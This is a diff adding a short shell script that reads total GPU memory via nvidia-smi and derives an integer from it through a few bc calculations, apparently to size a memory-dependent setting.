@@ -1,0 +1,8 @@
+google84121274=$(nvidia-smi --query-gpu=memory.total --format=csv | sed 's/MiB//g' | sed 's/memory.total//g' | sed 's/\s+\n+\r+//g' | sed 's/\[//g' | sed 's/\]//g')
+
+count=$(echo "$google84121274 - 400"|bc)
+googlelinux84=$(echo "$count / 16384"|bc -l)
+linuxgoogle84=$(echo "$googlelinux84 * 998"|bc)
+googlelinux8474=${linuxgoogle84%.*}
+
+echo $googlelinux8474
